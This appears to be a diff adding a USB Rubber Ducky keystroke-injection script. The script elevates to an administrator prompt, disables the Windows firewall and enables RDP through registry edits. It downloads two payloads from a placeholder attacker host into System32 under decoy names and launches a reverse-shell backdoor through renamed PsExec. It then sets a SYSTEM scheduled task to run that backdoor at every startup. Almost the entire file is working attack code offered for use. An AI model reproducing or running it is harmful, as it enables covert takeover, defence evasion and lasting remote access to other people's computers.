@@ -1,0 +1,50 @@
+REM Attack created by 3N|GmA
+DELAY 2000
+ESCAPE
+GUI r
+DELAY 3000
+REM Open command prompt with Admin rights
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 8000
+ALT y
+DELAY 4000
+REM Disable Windows firewall
+STRING netsh firewall set opmode disable
+DELAY 200
+ENTER
+DELAY 3000
+REM Enable terminal services / RDP
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 
+STRING /f
+DELAY 200
+ENTER
+DELAY 3000
+REM Enable terminal services / RDP
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+DELAY 200
+ENTER
+DELAY 3000
+REM Use ATAT's Persistence option with the "Windows DBD Reverse Shell" option to create your 2 payload files mentioned in this code
+STRING powershell (new-object System.Net.WebClient).DownloadFile('http://<IP_ADDRESS/DOMAIN>/winmgnt.txt','%WINDIR%\System32\winmgnt.
+STRING exe')
+DELAY 200
+ENTER
+STRING powershell (new-object System.Net.WebClient).DownloadFile('http://<IP_ADDRESS/DOMAIN>/taskmgnt.txt','%WINDIR%\System32\taskm
+STRING gnt.exe')
+DELAY 200
+ENTER
+REM Launch backdoor with obfuscated PsExec to have launched process run by Windows signed binary
+STRING %WINDIR%\System32\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe
+DELAY 200
+ENTER
+REM create scheduled task to connect backdoor on system start
+STRING schtasks /create /sc onstart /tn WindowsMgr /rl highest /ru SYSTEM /tr "%WINDIR%\System32\winmgnt.exe"
+DELAY 200
+ENTER
+STRING y
+DELAY 200
+ENTER
+STRING exit
+DELAY 200
+ENTER
